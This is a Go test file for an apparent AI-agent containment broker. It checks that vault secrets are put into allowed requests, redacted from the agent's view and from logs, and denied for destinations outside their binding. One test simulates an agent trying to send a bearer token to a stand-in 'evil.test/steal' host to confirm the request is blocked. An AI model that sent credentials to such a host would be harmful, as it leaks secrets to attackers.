package broker

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/aiegis/agentwarden/internal/contain"
	"github.com/aiegis/agentwarden/internal/decoy"
	"github.com/aiegis/agentwarden/internal/gate"
	"github.com/aiegis/agentwarden/internal/ledger"
	"github.com/aiegis/agentwarden/internal/policy"
	"github.com/aiegis/agentwarden/internal/vault"
	"github.com/aiegis/agentwarden/pkg/awspec"
)

const vaultCanary = "ghp_CANARY_must_not_leak_42"

// setupVault builds a broker whose net.egress is allowed, with a mock egress
// handler that echoes the (injected) Authorization header, plus a vault holding a
// secret bound to *.github.com.
func setupVault(t *testing.T) (*Broker, string) {
	t.Helper()
	root := t.TempDir()
	worktree := filepath.Join(root, "repo")
	if err := os.MkdirAll(worktree, 0o755); err != nil {
		t.Fatal(err)
	}
	ledgerPath := filepath.Join(root, "ledger.log")

	pol := &policy.Policy{
		Version:  "0.2",
		Defaults: policy.Defaults{Irreversible: awspec.Deny},
		Rules:    []policy.Rule{{Match: policy.Match{Substrate: awspec.SubNet, Class: "net.egress"}, Verdict: awspec.Allow}},
	}
	led, err := ledger.Open(ledgerPath)
	if err != nil {
		t.Fatal(err)
	}
	j, err := contain.NewJournal(worktree, filepath.Join(root, "snap"))
	if err != nil {
		t.Fatal(err)
	}
	g := gate.New(pol, []byte("k"), map[awspec.Substrate]bool{awspec.SubNet: true})

	v, err := vault.Open(filepath.Join(root, "vault.enc"), "p")
	if err != nil {
		t.Fatal(err)
	}
	v.Put("tok", vaultCanary, vault.Binding{Substrate: awspec.SubNet, Dests: []string{".github.com"}})

	echo := func(a awspec.Action) (string, error) {
		return "sent-authorization: " + a.Params["authorization"], nil
	}
	b := New(j, g, led, decoy.New(), map[awspec.Substrate]RealHandler{awspec.SubNet: echo}).WithVault(v)
	return b, ledgerPath
}

func TestVaultInjectAndRedact(t *testing.T) {
	b, ledgerPath := setupVault(t)
	res, err := b.Mediate(awspec.Action{AgentID: "a", Substrate: awspec.SubNet, Class: "net.egress",
		Params: map[string]string{"url": "https://api.github.com/x", "authorization": "Bearer ${vault:tok}"}})
	if err != nil {
		t.Fatal(err)
	}
	if res.Verdict != awspec.Allow {
		t.Fatalf("expected allow, got %s (%s)", res.Verdict, res.Reason)
	}
	// The agent's view must carry the marker, not the secret.
	if strings.Contains(res.Payload, vaultCanary) {
		t.Fatal("LEAK: secret value reached the agent payload")
	}
	if !strings.Contains(res.Payload, awspec.RedactMarker("tok")) {
		t.Fatalf("expected redaction marker in payload, got %q", res.Payload)
	}
	// The ledger must not contain the secret.
	if b, _ := os.ReadFile(ledgerPath); strings.Contains(string(b), vaultCanary) {
		t.Fatal("LEAK: secret value reached the ledger")
	}
}

func TestVaultDestinationBinding(t *testing.T) {
	b, _ := setupVault(t)
	// Same token, disallowed destination → deny, no injection.
	res, err := b.Mediate(awspec.Action{AgentID: "a", Substrate: awspec.SubNet, Class: "net.egress",
		Params: map[string]string{"url": "https://evil.test/steal", "authorization": "Bearer ${vault:tok}"}})
	if err != nil {
		t.Fatal(err)
	}
	if res.Verdict != awspec.Deny {
		t.Fatalf("expected deny for out-of-binding destination, got %s", res.Verdict)
	}
	if strings.Contains(res.Reason, vaultCanary) {
		t.Fatal("LEAK: secret value reached the deny reason")
	}
}

func TestVaultRefWithNoVaultFailsClosed(t *testing.T) {
	// A broker with no vault must deny any ${vault:...} reference.
	root := t.TempDir()
	led, _ := ledger.Open(filepath.Join(root, "l.log"))
	j, _ := contain.NewJournal(filepath.Join(root, "wt"), filepath.Join(root, "snap"))
	pol := &policy.Policy{Version: "0.2", Defaults: policy.Defaults{Irreversible: awspec.Deny},
		Rules: []policy.Rule{{Match: policy.Match{Substrate: awspec.SubNet, Class: "net.egress"}, Verdict: awspec.Allow}}}
	g := gate.New(pol, []byte("k"), map[awspec.Substrate]bool{awspec.SubNet: true})
	b := New(j, g, led, decoy.New(), map[awspec.Substrate]RealHandler{awspec.SubNet: func(a awspec.Action) (string, error) { return "ok", nil }})

	res, err := b.Mediate(awspec.Action{AgentID: "a", Substrate: awspec.SubNet, Class: "net.egress",
		Params: map[string]string{"url": "https://api.github.com/x", "authorization": "Bearer ${vault:tok}"}})
	if err != nil {
		t.Fatal(err)
	}
	if res.Verdict != awspec.Deny {
		t.Fatalf("expected deny when no vault configured, got %s", res.Verdict)
	}
}
